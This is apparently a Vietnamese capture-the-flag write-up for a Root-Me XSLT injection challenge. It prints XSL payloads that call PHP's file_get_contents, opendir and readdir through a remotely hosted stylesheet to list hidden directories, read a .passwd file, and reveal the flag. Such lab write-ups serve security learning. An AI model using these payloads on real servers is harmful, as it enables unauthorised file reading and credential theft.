![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/51277add-dec3-4e60-bbd9-12d8c5edd368)

Chọn style sẽ hiển thị ra

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/ce81e263-925b-44b0-aede-14ad0f4962e5)

Đọc trên trang này (https://security.stackexchange.com/questions/170712/execute-a-php-function-that-returns-an-array-from-an-xsl-file) , ta có được 1 đoạn code để đọc file

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','index.php')"/>
</xsl:template>
</xsl:stylesheet>
```
Tạo 1 gist để thực hiện RFI

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/cfbc13ca-5069-4c62-8eed-4e46e0a192c0)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/613ffe7a-518e-49d1-ae0d-f96724d016af)

=> File index.php không có gì. Thử đọc file .passwd nhưng có vẻ như nó không nằm ở dir /

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/47310a44-4d3f-4984-b0cc-e96b324d2411)

cũng trong cmt của site trên stack kia, ta thấy cách để scan dir

```
<xsl:value-of select="php:function('opendir','./')"/>
<xsl:value-of select="php:function('readdir')"/>
```
![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/5f368b18-8976-4c7d-8b28-d16000001a14)

=)))) trông hơi nhìu func readdir nhỉ nhma tôi có đọc thêm ở chỗ khác thì biết được vì XSL nó k auto show ra, bạn ```cat``` bao nhiêu nó show bấy nhiêu thôi. Nên cứ add nhiều , nếu thừa thì nó trả về false thôi.

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/eea40849-a979-4e2a-be67-8a5a850fecfa)

=)) thừa ra mấy cái false lận nhma không sao

Đọc cái file trông khả nghi là ".6ff3200bee785801f420fba826ffcdee" nhma có lẽ nó là dir. 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/13053be8-41a0-4bf5-bf6c-634b61f98f09)

vậy thì scan nó tiếp :v

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/b40be4d2-feef-4570-8263-feadc6604c21)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/d3d20aa3-6b97-4678-bbc5-2a49efe4a989)

đây rồi =)))) file .passwd

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/9be6b370-ed36-4eb3-999d-2e896188f0dc)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/c794ea14-f556-4d95-be0a-0a6c56acb8ce)

=> flag: X5L7_R0ckS

=))) ai thắc mắc sao ban đầu là exploit.xsl mà về sau là read_file.xsl và scan_dir.xsl thì do thấy dùng nhiều nên tôi
chia ra cho lẹ
